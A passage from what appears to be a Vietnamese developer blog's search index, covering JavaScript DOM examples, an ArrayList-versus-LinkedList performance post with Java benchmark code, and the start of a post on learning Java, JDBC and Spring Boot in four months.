id=\u0026#34;todoList\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; JavaScript:\nlet input = document.getElementById(\u0026#34;input\u0026#34;); let addBtn = document.getElementById(\u0026#34;add\u0026#34;); let list = document.getElementById(\u0026#34;todoList\u0026#34;); addBtn.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { let task = input.value; if (task) { let li = document.createElement(\u0026#34;li\u0026#34;); li.textContent = task; let delBtn = document.createElement(\u0026#34;button\u0026#34;); delBtn.textContent = \u0026#34;Xóa\u0026#34;; delBtn.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; li.remove()); li.appendChild(delBtn); list.appendChild(li); input.value = \u0026#34;\u0026#34;; } }); 9.2. Tạo hiệu ứng hover #\u0026lt;div id=\u0026#34;box\u0026#34;\u0026gt;Di chuột qua\u0026lt;/div\u0026gt; let box = document.getElementById(\u0026#34;box\u0026#34;); box.addEventListener(\u0026#34;mouseover\u0026#34;, () =\u0026gt; { box.style.backgroundColor = \u0026#34;yellow\u0026#34;; }); box.addEventListener(\u0026#34;mouseout\u0026#34;, () =\u0026gt; { box.style.backgroundColor = \u0026#34;\u0026#34;; }); 9.3. Form validation #\u0026lt;form id=\u0026#34;form\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;email\u0026#34; id=\u0026#34;email\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Gửi\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; let form = document.getElementById(\u0026#34;form\u0026#34;); let email = document.getElementById(\u0026#34;email\u0026#34;); form.addEventListener(\u0026#34;submit\u0026#34;, (e) =\u0026gt; { e.preventDefault(); if (/^\\S+@\\S+\\.\\S+$/.test(email.value)) { console.log(\u0026#34;Email hợp lệ!\u0026#34;); } else { console.log(\u0026#34;Email không hợp lệ!\u0026#34;); } }); 10. Lỗi thường gặp và cách tránh #10.1. Lỗi truy cập phần tử không tồn tại # Lỗi: document.getElementById(\u0026quot;id\u0026quot;) trả về null. Cách tránh: Kiểm tra trước khi dùng. let el = document.getElementById(\u0026#34;id\u0026#34;); if (el) el.textContent = \u0026#34;OK\u0026#34;; 10.2. Lỗi sự kiện lặp lại # Thêm nhiều listener trùng lặp. Cách tránh: Dùng removeEventListener hoặc kiểm tra. 10.3. Lỗi hiệu suất # Thao tác DOM trong vòng lặp lớn. Cách tránh: Dùng DocumentFragment, cache DOM. 11. Kết luận và mẹo sử dụng # Tóm tắt: DOM là bản đồ trang web, giúp JavaScript tương tác động (đọc, sửa, thêm, xóa phần tử, xử lý sự kiện). Mẹo: Dùng querySelector cho tìm kiếm linh hoạt. Cache DOM vào biến để tăng tốc. Sử dụng addEventListener thay vì onclick. Thực hành: Tạo todo list, form, hoặc hiệu ứng động. Học thêm thư viện (React, Vue) để hiểu Virtual DOM. Flowchart chi tiết:\n[ document ]\r|\r└── [ html ]\r|\r├── [ head ]\r└── [ body ]\r|\r├── [ div#main ] --\u0026gt; getElementById\r├── [ p.text ] --\u0026gt; querySelectorAll\r└── [ button ] --\u0026gt; addEventListener(click)\r|\rv\rThay đổi: textContent, style\rThêm/xóa: appendChild, remove 12. Tài liệu tham khảo # MDN Web Docs: DOM JavaScript.info: DOM Eloquent JavaScript: The Document Object Model W3Schools: JavaScript DOM ","date":"13 October 2025","permalink":"http://localhost:1313/posts/dom-js/","section":"Posts","summary":"","title":"Hiểu Biết DOM Trong JavaScript"},{"content":"Tháng trước, sếp giao cho tôi một task đơn giản: \u0026ldquo;Làm feature import 10,000 sinh viên từ Excel vào hệ thống.\u0026rdquo;\nNghe có vẻ easy phải không? Tôi cũng nghĩ vậy. 2 tiếng sau, tôi hoàn thành. Click import, và\u0026hellip;\n10 giây.\nApplication freeze 10 giây. Progress bar không động đậy. User nghĩ app bị crash. Sếp nhìn tôi với ánh mắt \u0026ldquo;You\u0026rsquo;re kidding me, right?\u0026rdquo;\nVấn đề? Một dòng code:\nList\u0026lt;Student\u0026gt; students = new LinkedList\u0026lt;\u0026gt;(); Đổi sang:\nList\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(); 0.1 giây. Nhanh hơn 100 lần.\nCâu chuyện này dạy tôi một bài học quan trọng: Chọn đúng data structure quan trọng hơn code đẹp.\n🎯 Collections Framework là gì? #Trước khi đi sâu, hãy hiểu big picture.\nJava Collections Framework là một tập hợp các interfaces và classes để lưu trữ và thao tác nhóm objects. Nó giải quyết vấn đề: Làm sao quản lý nhiều objects hiệu quả?\nCore Interfaces:\nCollection\r├── List (ordered, duplicates allowed)\r│ ├── ArrayList\r│ ├── LinkedList\r│ └── Vector\r├── Set (no duplicates)\r│ ├── HashSet\r│ ├── LinkedHashSet\r│ └── TreeSet\r└── Queue (FIFO)\r├── PriorityQueue\r└── LinkedList\rMap (key-value pairs)\r├── HashMap\r├── LinkedHashMap\r└── TreeMap Bài này tập trung vào List - phổ biến nhất và cũng hay bị hiểu lầm nhất.\n📊 ArrayList vs LinkedList: The Showdown #Mental Model #Trước khi xem code, hãy tưởng tượng thực tế:\nArrayList = Dãy nhà liền kề\nTất cả nhà nằm cạnh nhau Biết địa chỉ nhà số 1 → Tìm nhà số 100 rất nhanh (100 bước) Muốn xây thêm nhà giữa? Phải dời tất cả nhà phía sau LinkedList = Trò chơi tìm kho báu\nMỗi nhà có tờ giấy chỉ đường đến nhà tiếp theo Muốn đến nhà số 100? Phải đi qua 99 nhà trước đó Muốn xây nhà mới giữa chừng? Chỉ cần đổi 2 tờ giấy Internal Structure #// ArrayList - Continuous memory [Student1][Student2][Student3][Student4][Student5]... ↓ Direct access: arr[100] → O(1) // LinkedList - Scattered memory [Student1] → [Student2] → [Student3] → [Student4] →... ↓ Must traverse: Start → Next → Next → ... → Node 100 → O(n) 🔬 Thí nghiệm thực tế #Tôi viết một benchmark đơn giản để test performance:\nimport java.util.*; public class CollectionsBenchmark { private static final int SIZE = 100_000; public static void main(String[] args) { System.out.println(\u0026#34;=== COLLECTIONS BENCHMARK ===\\n\u0026#34;); // Test 1: Add elements testAdd(); // Test 2: Get element by index testGet(); // Test 3: Insert in middle testInsert(); // Test 4: Remove from middle testRemove(); // Test 5: Iterate testIterate(); } // Test 1: Adding elements to end private static void testAdd() { System.out.println(\u0026#34;TEST 1: Adding 100,000 elements\u0026#34;); // ArrayList long start = System.nanoTime(); List\u0026lt;Integer\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; SIZE; i++) { arrayList.add(i); } long arrayListTime = System.nanoTime() - start; // LinkedList start = System.nanoTime(); List\u0026lt;Integer\u0026gt; linkedList = new LinkedList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; SIZE; i++) { linkedList.add(i); } long linkedListTime = System.nanoTime() - start; System.out.println(\u0026#34;ArrayList: \u0026#34; + arrayListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;LinkedList: \u0026#34; + linkedListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;Winner: \u0026#34; + (arrayListTime \u0026lt; linkedListTime ? \u0026#34;ArrayList\u0026#34; : \u0026#34;LinkedList\u0026#34;)); System.out.println(); } // Test 2: Random access private static void testGet() { System.out.println(\u0026#34;TEST 2: Random access (get 10,000 times)\u0026#34;); List\u0026lt;Integer\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; linkedList = new LinkedList\u0026lt;\u0026gt;(); // Populate for (int i = 0; i \u0026lt; SIZE; i++) { arrayList.add(i); linkedList.add(i); } Random random = new Random(); // ArrayList long start = System.nanoTime(); for (int i = 0; i \u0026lt; 10_000; i++) { int index = random.nextInt(SIZE); arrayList.get(index); } long arrayListTime = System.nanoTime() - start; // LinkedList start = System.nanoTime(); for (int i = 0; i \u0026lt; 10_000; i++) { int index = random.nextInt(SIZE); linkedList.get(index); } long linkedListTime = System.nanoTime() - start; System.out.println(\u0026#34;ArrayList: \u0026#34; + arrayListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;LinkedList: \u0026#34; + linkedListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;Difference: \u0026#34; + (linkedListTime / arrayListTime) + \u0026#34;x slower\u0026#34;); System.out.println(); } // Test 3: Insert in middle private static void testInsert() { System.out.println(\u0026#34;TEST 3: Insert 1,000 elements at position 0\u0026#34;); List\u0026lt;Integer\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; linkedList = new LinkedList\u0026lt;\u0026gt;(); // ArrayList long start = System.nanoTime(); for (int i = 0; i \u0026lt; 1_000; i++) { arrayList.add(0, i); // Insert at beginning } long arrayListTime = System.nanoTime() - start; // LinkedList start = System.nanoTime(); for (int i = 0; i \u0026lt; 1_000; i++) { linkedList.add(0, i); // Insert at beginning } long linkedListTime = System.nanoTime() - start; System.out.println(\u0026#34;ArrayList: \u0026#34; + arrayListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;LinkedList: \u0026#34; + linkedListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;Winner: \u0026#34; + (arrayListTime \u0026lt; linkedListTime ? \u0026#34;ArrayList\u0026#34; : \u0026#34;LinkedList\u0026#34;)); System.out.println(); } // Test 4: Remove from middle private static void testRemove() { System.out.println(\u0026#34;TEST 4: Remove 1,000 elements from beginning\u0026#34;); List\u0026lt;Integer\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; linkedList = new LinkedList\u0026lt;\u0026gt;(); // Populate for (int i = 0; i \u0026lt; 10_000; i++) { arrayList.add(i); linkedList.add(i); } // ArrayList long start = System.nanoTime(); for (int i = 0; i \u0026lt; 1_000; i++) { arrayList.remove(0); } long arrayListTime = System.nanoTime() - start; // LinkedList start = System.nanoTime(); for (int i = 0; i \u0026lt; 1_000; i++) { linkedList.remove(0); } long linkedListTime = System.nanoTime() - start; System.out.println(\u0026#34;ArrayList: \u0026#34; + arrayListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;LinkedList: \u0026#34; + linkedListTime / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;Winner: \u0026#34; + (arrayListTime \u0026lt; linkedListTime ? \u0026#34;ArrayList\u0026#34; : \u0026#34;LinkedList\u0026#34;)); System.out.println(); } // Test 5: Iteration private static void testIterate() { System.out.println(\u0026#34;TEST 5: Iterate through 100,000 elements\u0026#34;); List\u0026lt;Integer\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; linkedList = new LinkedList\u0026lt;\u0026gt;(); // Populate for (int i = 0; i \u0026lt; SIZE; i++) { arrayList.add(i); linkedList.add(i); } // ArrayList - for loop long start = System.nanoTime(); for (int i = 0; i \u0026lt; arrayList.size(); i++) { int val = arrayList.get(i); } long arrayListForLoop = System.nanoTime() - start; // ArrayList - foreach start = System.nanoTime(); for (Integer val : arrayList) { // Do nothing } long arrayListForeach = System.nanoTime() - start; // LinkedList - for loop (BAD!) start = System.nanoTime(); for (int i = 0; i \u0026lt; linkedList.size(); i++) { int val = linkedList.get(i); } long linkedListForLoop = System.nanoTime() - start; // LinkedList - foreach start = System.nanoTime(); for (Integer val : linkedList) { // Do nothing } long linkedListForeach = System.nanoTime() - start; System.out.println(\u0026#34;ArrayList (for loop): \u0026#34; + arrayListForLoop / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;ArrayList (foreach): \u0026#34; + arrayListForeach / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(\u0026#34;LinkedList (for loop): \u0026#34; + linkedListForLoop / 1_000_000 + \u0026#34; ms ❌ VERY SLOW!\u0026#34;); System.out.println(\u0026#34;LinkedList (foreach): \u0026#34; + linkedListForeach / 1_000_000 + \u0026#34; ms\u0026#34;); System.out.println(); } } Kết quả trên máy của tôi: #=== COLLECTIONS BENCHMARK ===\rTEST 1: Adding 100,000 elements\rArrayList: 8 ms\rLinkedList: 15 ms\rWinner: ArrayList\rTEST 2: Random access (get 10,000 times)\rArrayList: 1 ms\rLinkedList: 4,250 ms\rDifference: 4250x slower ⚠️\rTEST 3: Insert 1,000 elements at position 0\rArrayList: 125 ms\rLinkedList: 2 ms\rWinner: LinkedList ✅\rTEST 4: Remove 1,000 elements from beginning\rArrayList: 120 ms\rLinkedList: 1 ms\rWinner: LinkedList ✅\rTEST 5: Iterate through 100,000 elements\rArrayList (for loop): 3 ms\rArrayList (foreach): 3 ms\rLinkedList (for loop): 28,000 ms ❌ DISASTER!\rLinkedList (foreach): 3 ms 📈 Big O Analysis # Operation ArrayList LinkedList Add (end) O(1)* O(1) Add (beginning) O(n) O(1) ✅ Add (middle) O(n) O(n) Get by index O(1) ✅ O(n) Remove (end) O(1) O(1) Remove (beginning) O(n) O(1) ✅ Search O(n) O(n) Memory Compact More overhead *Amortized O(1) - Occasionally O(n) when resizing\n🎯 Khi nào dùng gì? #Dùng ArrayList khi: #✅ Random access nhiều\n// Scenario: Lấy student theo ID nhiều lần List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(); // ... populate list // Fast access Student student = students.get(1000); // O(1) - instant ✅ Iterate nhiều\n// Process all students for (Student student : students) { processStudent(student); // Fast with ArrayList } ✅ Thêm vào cuối\n// Log messages List\u0026lt;String\u0026gt; logs = new ArrayList\u0026lt;\u0026gt;(); logs.add(\u0026#34;User logged in\u0026#34;); // O(1) - fast logs.add(\u0026#34;User clicked button\u0026#34;); // O(1) - fast ✅ Memory constraint\nArrayList compact hơn LinkedList Quan trọng với data lớn Dùng LinkedList khi: #✅ Insert/remove đầu list nhiều\n// Queue implementation List\u0026lt;Task\u0026gt; taskQueue = new LinkedList\u0026lt;\u0026gt;(); taskQueue.add(0, newTask); // O(1) - fast Task next = taskQueue.remove(0); // O(1) - fast ✅ Không biết trước size\nArrayList phải resize → costly LinkedList không cần ✅ Implement Queue/Deque\nDeque\u0026lt;String\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); queue.addFirst(\u0026#34;First\u0026#34;); // O(1) queue.addLast(\u0026#34;Last\u0026#34;); // O(1) queue.removeFirst(); // O(1) 💥 Common Mistakes (Và cách tôi mắc phải) #Mistake 1: Dùng for loop với LinkedList #// ❌ DISASTER - O(n²) complexity LinkedList\u0026lt;Student\u0026gt; students = new LinkedList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; students.size(); i++) { Student s = students.get(i); // Each get() is O(n)! processStudent(s); } // ✅ CORRECT - O(n) complexity for (Student s : students) { // Uses iterator internally processStudent(s); } // ✅ EVEN BETTER - Explicit iterator Iterator\u0026lt;Student\u0026gt; it = students.iterator(); while (it.hasNext()) { Student s = it.next(); processStudent(s); } Lesson: Luôn dùng foreach hoặc iterator với LinkedList!\nMistake 2: Không set initial capacity cho ArrayList #// ❌ BAD - Resizing nhiều lần List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 100_000; i++) { students.add(new Student()); // Resize at 10, 20, 40, 80... } // ✅ GOOD - Allocate once List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(100_000); for (int i = 0; i \u0026lt; 100_000; i++) { students.add(new Student()); // No resizing! } Impact:\nBad version: ~15ms Good version: ~8ms 47% faster! Mistake 3: Chọn LinkedList vì \u0026ldquo;nghe có vẻ pro\u0026rdquo; #Đây là sai lầm của tôi. Tôi nghĩ LinkedList \u0026ldquo;advanced\u0026rdquo; hơn ArrayList, nên dùng mọi nơi. Kết quả? Performance disaster.\nReality: 95% trường hợp, ArrayList là lựa chọn đúng.\n🔍 Real-World Example: Excel Import #Quay lại story lúc đầu. Đây là code gốc của tôi:\n// Version 1.0 - SLOW (10 seconds) public class StudentImporter { public List\u0026lt;Student\u0026gt; importFromExcel(String filePath) { List\u0026lt;Student\u0026gt; students = new LinkedList\u0026lt;\u0026gt;(); // ❌ Wrong choice try (FileInputStream file = new FileInputStream(filePath)) { Workbook workbook = new XSSFWorkbook(file); Sheet sheet = workbook.getSheetAt(0); for (Row row : sheet) { // Parse row String id = row.getCell(0).getStringCellValue(); String name = row.getCell(1).getStringCellValue(); double gpa = row.getCell(2).getNumericCellValue(); // Create student Student student = new Student(id, name, gpa); // Add to list students.add(student); // OK at end // ❌ PROBLEM: Later processing // Frequently access by index } } catch (IOException e) { e.printStackTrace(); } // ❌ DISASTER: Processing with index access for (int i = 0; i \u0026lt; students.size(); i++) { Student s = students.get(i); // O(n) each time! // Validate if (s.getGpa() \u0026lt; 0) { students.remove(i); // O(n) i--; // Adjust index } } return students; } } Problems:\nLinkedList + index access = O(n²) Iterate + remove = more O(n) operations Total: Very slow! // Version 2.0 - FAST (0.1 seconds) public class StudentImporter { public List\u0026lt;Student\u0026gt; importFromExcel(String filePath) { // ✅ ArrayList with initial capacity List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(10_000); try (FileInputStream file = new FileInputStream(filePath)) { Workbook workbook = new XSSFWorkbook(file); Sheet sheet = workbook.getSheetAt(0); for (Row row : sheet) { String id = row.getCell(0).getStringCellValue(); String name = row.getCell(1).getStringCellValue(); double gpa = row.getCell(2).getNumericCellValue(); // Validate BEFORE adding if (gpa \u0026gt;= 0 \u0026amp;\u0026amp; gpa \u0026lt;= 4.0) { Student student = new Student(id, name, gpa); students.add(student); // O(1) } } } catch (IOException e) { e.printStackTrace(); } // No need to iterate again! return students; } } Improvements:\nArrayList → fast index access Initial capacity → no resizing Validate before add → no remove needed Result: 100x faster! 🧪 Bonus: Other Collections #HashSet - No duplicates #// Remove duplicate students Set\u0026lt;Student\u0026gt; uniqueStudents = new HashSet\u0026lt;\u0026gt;(studentList); // Fast lookup - O(1) if (uniqueStudents.contains(someStudent)) { // Found instantly } HashMap - Key-value pairs #// Student lookup by ID - O(1) Map\u0026lt;String, Student\u0026gt; studentMap = new HashMap\u0026lt;\u0026gt;(); studentMap.put(\u0026#34;S001\u0026#34;, student1); studentMap.put(\u0026#34;S002\u0026#34;, student2); // Instant access Student found = studentMap.get(\u0026#34;S001\u0026#34;); // O(1) - super fast! TreeSet - Sorted set #// Auto-sorted by GPA Set\u0026lt;Student\u0026gt; topStudents = new TreeSet\u0026lt;\u0026gt;( Comparator.comparingDouble(Student::getGpa).reversed() ); topStudents.add(student1); // Auto-sorts topStudents.add(student2); // First element = highest GPA Student top = topStudents.first(); 📊 Quick Decision Tree #Need to store multiple objects?\r│\r├─ Need duplicates?\r│ ├─ Yes → Use List\r│ │ ├─ Random access? → ArrayList ✅\r│ │ ├─ Insert/remove at beginning? → LinkedList\r│ │ └─ Don\u0026#39;t know? → ArrayList (safe default)\r│ │\r│ └─ No → Use Set\r│ ├─ Need sorted? → TreeSet\r│ ├─ Need insertion order? → LinkedHashSet\r│ └─ Don\u0026#39;t care? → HashSet\r│\r└─ Need key-value pairs? → Use Map\r├─ Need sorted by key? → TreeMap\r├─ Need insertion order? → LinkedHashMap\r└─ Don\u0026#39;t care? → HashMap 💡 Best Practices #1. Default to ArrayList #Khi không chắc chắn, chọn ArrayList. 95% cases đúng.\n2. Set initial capacity nếu biết size #List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(expectedSize); 3. Dùng interface type #// ✅ Good - Flexible List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(); // ❌ Bad - Locked to implementation ArrayList\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(); 4. Foreach thay vì for loop #// ✅ Always safe for (Student s : students) { // Process } // ⚠️ Only with ArrayList for (int i = 0; i \u0026lt; students.size(); i++) { Student s = students.get(i); } 5. Iterator khi cần remove #Iterator\u0026lt;Student\u0026gt; it = students.iterator(); while (it.hasNext()) { Student s = it.next(); if (shouldRemove(s)) { it.remove(); // Safe removal } } 🎯 Challenge: Tối ưu code này #// Đoạn code này có vấn đề gì? public class StudentProcessor { public void processStudents() { LinkedList\u0026lt;Student\u0026gt; students = new LinkedList\u0026lt;\u0026gt;(); // Load 100,000 students for (int i = 0; i \u0026lt; 100_000; i++) { students.add(loadStudent(i)); } // Process each student for (int i = 0; i \u0026lt; students.size(); i++) { Student s = students.get(i); if (s.getGpa() \u0026lt; 2.0) { students.remove(i); i--; } } // Print all for (int i = 0; i \u0026lt; students.size(); i++) { System.out.println(students.get(i)); } } } Bạn tìm được mấy vấn đề? Comment dưới nhé!\nXem đáp án\rVấn đề:\nLinkedList + index access → O(n²) Remove trong loop → không efficient Print cũng dùng index → slow Solution:\npublic class StudentProcessor { public void processStudents() { // ✅ ArrayList + initial capacity List\u0026lt;Student\u0026gt; students = new ArrayList\u0026lt;\u0026gt;(100_000); for (int i = 0; i \u0026lt; 100_000; i++) { Student s = loadStudent(i); // ✅ Filter while loading if (s.getGpa() \u0026gt;= 2.0) { students.add(s); } } // ✅ Foreach để print for (Student s : students) { System.out.println(s); } } } Result: From 30 seconds → 0.5 seconds (60x faster!)\n📚 Resources để học sâu #Documentation:\nJava Collections Framework - Oracle ArrayList JavaDoc LinkedList JavaDoc Books:\n\u0026ldquo;Effective Java\u0026rdquo; by Joshua Bloch (Chapter on Collections) \u0026ldquo;Data Structures and Algorithms in Java\u0026rdquo; Practice:\nLeetCode Collections Problems HackerRank Java Collections 💭 Kết luận #Collections Framework không khó. Nhưng chọn sai có thể làm app của bạn chậm đi 100 lần.\nKey takeaways:\n✅ ArrayList cho 95% cases\n✅ LinkedList chỉ khi insert/remove đầu list nhiều\n✅ Luôn dùng foreach với LinkedList\n✅ Set initial capacity khi biết size\n✅ Profile trước khi optimize\n6 tháng trước, tôi không quan tâm đến performance. \u0026ldquo;Code chạy là được.\u0026rdquo; Hôm nay, sau khi app freeze 10 giây và bị sếp nhìn kiểu \u0026ldquo;wtf\u0026rdquo;, tôi học được bài học đắt giá:\nThe right data structure makes all the difference.\nMay your Lists be fast and your code be clean! 🚀\nBạn đã mắc sai lầm nào với Collections? Chia sẻ story nhé!\n#Java #Collections #Performance #DataStructures #Programming\n","date":"12 October 2025","permalink":"http://localhost:1313/posts/collections-framework-java/","section":"Posts","summary":"Tôi từng nghĩ ArrayList và LinkedList giống nhau. Cho đến khi app của tôi xử lý 10 giây thay vì 0.1 giây. Đây là những gì tôi học được.","title":"ArrayList vs LinkedList: Câu chuyện về cái giá của sự lựa chọn sai"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/beginner/","section":"Tags","summary":"","title":"Beginner"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/career/","section":"Categories","summary":"","title":"Career"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/collections/","section":"Tags","summary":"","title":"Collections"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/data-structures/","section":"Tags","summary":"","title":"Data Structures"},{"content":"Tháng 5 năm ngoái, tôi ngồi trước màn hình laptop với một quyết định: Học Java. Không phải vì áp lực, không phải vì bắt buộc, mà vì tôi muốn hiểu cách những ứng dụng ngân hàng, thương mại điện tử mà tôi dùng hàng ngày được xây dựng như thế nào.\n4 tháng sau, tôi có thể tự tin build một REST API hoàn chỉnh với Spring Boot, deploy lên server, và thậm chí hướng dẫn bạn bè học lập trình. Nhưng con đường đó không hề dễ dàng như tôi nghĩ.\nĐây là câu chuyện của tôi - những gì hiệu quả, những gì không, và lời khuyên tôi muốn gửi đến bản thân 4 tháng trước.\n🎯 Tại sao chọn Java? #Trước khi bắt đầu, tôi đã research khá kỹ. Có quá nhiều lựa chọn: Python, JavaScript, C++\u0026hellip; Nhưng cuối cùng tôi chọn Java vì 3 lý do:\n1. Việc làm nhiều\nTheo JobStreet và ITviec, Java developer luôn trong top 3 ngôn ngữ được tuyển dụng nhiều nhất tại Việt Nam. Các ngân hàng, fintech, enterprise đều cần Java.\n2. Ecosystem mạnh mẽ\nSpring Boot, Hibernate, Maven\u0026hellip; Một khi học Java, bạn được tiếp cận cả một hệ sinh thái công cụ đã mature và production-ready.\n3. Tư duy lập trình vững chắc\nJava bắt buộc bạn phải hiểu OOP (Object-Oriented Programming) từ đầu. Không có shortcut. Điều này tuy khó nhưng lại giúp bạn code bất kỳ ngôn ngữ nào sau này đều dễ dàng.\n📅 Lộ trình 4 tháng của tôi #Tháng 1: Nền tảng (Java Core) #Mục tiêu: Hiểu syntax cơ bản, biến, vòng lặp, điều kiện\nTài liệu học:\nKhóa \u0026ldquo;Java Programming for Complete Beginners\u0026rdquo; trên Udemy (40 giờ) Sách \u0026ldquo;Head First Java\u0026rdquo; (đọc song song) Practice trên HackerRank Những gì tôi đã làm:\nCode mỗi ngày 2 giờ, không bỏ lỡ ngày nào Giải 30 bài tập trên HackerRank (Easy level) Xây dựng mini project: Calculator console app Sai lầm tôi mắc phải:\n❌ Học quá nhiều lý thuyết, ít thực hành\n❌ Không note lại kiến thức, quên rất nhanh\n❌ Không tham gia cộng đồng, học một mình rất cô đơn\nCách khắc phục:\n✅ Rule: Học 30 phút lý thuyết → Code ngay 1 giờ\n✅ Tạo Notion workspace để ghi chú\n✅ Join Discord \u0026ldquo;Java Vietnam\u0026rdquo; để hỏi đáp\n// Project đầu tiên của tôi - Simple Calculator import java.util.Scanner; public class Calculator { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.println(\u0026#34;=== SIMPLE CALCULATOR ===\u0026#34;); System.out.print(\u0026#34;Enter first number: \u0026#34;); double num1 = scanner.nextDouble(); System.out.print(\u0026#34;Enter operator (+, -, *, /): \u0026#34;); char operator = scanner.next().charAt(0); System.out.print(\u0026#34;Enter second number: \u0026#34;); double num2 = scanner.nextDouble(); double result = 0; boolean validOperation = true; switch (operator) { case \u0026#39;+\u0026#39;: result = num1 + num2; break; case \u0026#39;-\u0026#39;: result = num1 - num2; break; case \u0026#39;*\u0026#39;: result = num1 * num2; break; case \u0026#39;/\u0026#39;: if (num2 != 0) { result = num1 / num2; } else { System.out.println(\u0026#34;Error: Division by zero!\u0026#34;); validOperation = false; } break; default: System.out.println(\u0026#34;Invalid operator!\u0026#34;); validOperation = false; } if (validOperation) { System.out.printf(\u0026#34;Result: %.2f %c %.2f = %.2f%n\u0026#34;, num1, operator, num2, result); } scanner.close(); } } Nhìn lại đoạn code này giờ tôi thấy nó đơn giản và\u0026hellip; hơi naive. Nhưng đó là bước đầu tiên, và tôi tự hào về nó.\nTháng 2: OOP và Collections #Mục tiêu: Thành thạo 4 trụ cột OOP, hiểu Collections Framework\nTháng này là giai đoạn khó nhất. OOP không phải thứ bạn có thể \u0026ldquo;học\u0026rdquo; trong một tuần. Bạn phải sống với nó.\nKhái niệm phải nắm:\nEncapsulation (Đóng gói) Inheritance (Kế thừa) Polymorphism (Đa hình) Abstraction (Trừu tượng hóa) Project breakthrough:\nTôi build một Student Management System - quản lý sinh viên, điểm số, lớp học. Đây là lúc mọi thứ click!\nKhi phải thiết kế class Student, Teacher, Course, tôi mới thực sự hiểu tại sao cần Inheritance. Khi phải lưu trữ danh sách sinh viên, tôi mới biết ArrayList vs LinkedList khác nhau thế nào.\nCột mốc quan trọng:\n✅ Hiểu được khi nào dùng ArrayList, khi nào dùng HashMap\n✅ Biết design một class với proper encapsulation\n✅ Có thể giải thích OOP cho người khác (dấu hiệu bạn đã thực sự hiểu)\nTháng 3: Database và JDBC #Mục tiêu: Kết nối Java với database, thao tác CRUD\nLần đầu tiên code của tôi \u0026ldquo;sống\u0026rdquo; được lâu hơn việc tắt IDE. Dữ liệu được lưu vào MySQL và tồn tại mãi mãi (cho đến khi tôi DROP TABLE nhầm 😅).\nCông nghệ học:\nMySQL cơ bản JDBC API SQL queries (SELECT, INSERT, UPDATE, DELETE) Project: Nâng cấp Student Management System với database\n// Lần đầu kết nối database - moment đáng nhớ public class DatabaseConnection { private static final String URL = \u0026#34;jdbc:mysql://localhost:3306/student_db\u0026#34;; private static final String USER = \u0026#34;root\u0026#34;; private static final String PASSWORD = \u0026#34;password\u0026#34;; public static Connection getConnection() throws SQLException { return DriverManager.getConnection(URL, USER, PASSWORD); } } // CRUD Operation - Insert Student public void addStudent(Student student) { String sql = \u0026#34;INSERT INTO students (name, email, gpa) VALUES (?, ?, ?)\u0026#34;; try (Connection conn = DatabaseConnection.getConnection(); PreparedStatement stmt = conn.prepareStatement(sql)) { stmt.setString(1, student.getName()); stmt.setString(2, student.getEmail()); stmt.setDouble(3, student.getGpa()); int rowsAffected = stmt.executeUpdate(); System.out.println(rowsAffected + \u0026#34; student(s) added!\u0026#34;); } catch (SQLException e) { System.err.println(\u0026#34;Error adding student: \u0026#34; + e.getMessage()); } } Lesson learned:\nLuôn dùng PreparedStatement thay vì Statement (SQL Injection prevention) Try-with-resources tự động close connection Error handling rất quan trọng khi làm việc với database Tháng 4: Spring Boot và REST API #Mục tiêu: Build một REST API production-ready\nĐây là tháng mọi thứ thay đổi. Từ code console app, tôi bước sang thế giới web development.\nTech stack:\nSpring Boot Spring Data JPA MySQL Postman (testing API) Project cuối khóa: User Management REST API\nMột API đơn giản nhưng đầy đủ:\nUser registration Login (JWT authentication) CRUD users Role-based access control @RestController @RequestMapping(\u0026#34;/api/users\u0026#34;) public class UserController { @Autowired private UserService userService; // GET all users @GetMapping public ResponseEntity\u0026lt;List\u0026lt;User\u0026gt;\u0026gt; getAllUsers() { List\u0026lt;User\u0026gt; users = userService.findAll(); return ResponseEntity.ok(users); } // GET user by ID @GetMapping(\u0026#34;/{id}\u0026#34;) public ResponseEntity\u0026lt;User\u0026gt; getUserById(@PathVariable Long id) { User user = userService.findById(id); if (user != null) { return 